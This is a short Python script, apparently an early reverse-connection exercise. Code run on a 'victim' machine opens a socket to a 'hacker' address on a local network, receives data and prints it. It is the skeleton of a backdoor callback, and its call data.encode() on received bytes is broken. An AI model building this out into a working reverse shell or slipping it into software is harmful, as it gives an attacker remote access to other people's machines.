import socket

def main():
    victim_socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_IP="192.168.0.97"
    hacker_Port=8008

    hacker_address=(hacker_IP, hacker_Port)
    victim_socket.connect(hacker_address)
    print("hello")
    data= victim_socket.recv(1024)
    
    print(data.encode())

    victim_socket.close()


if __name__ =="__main__":
    main()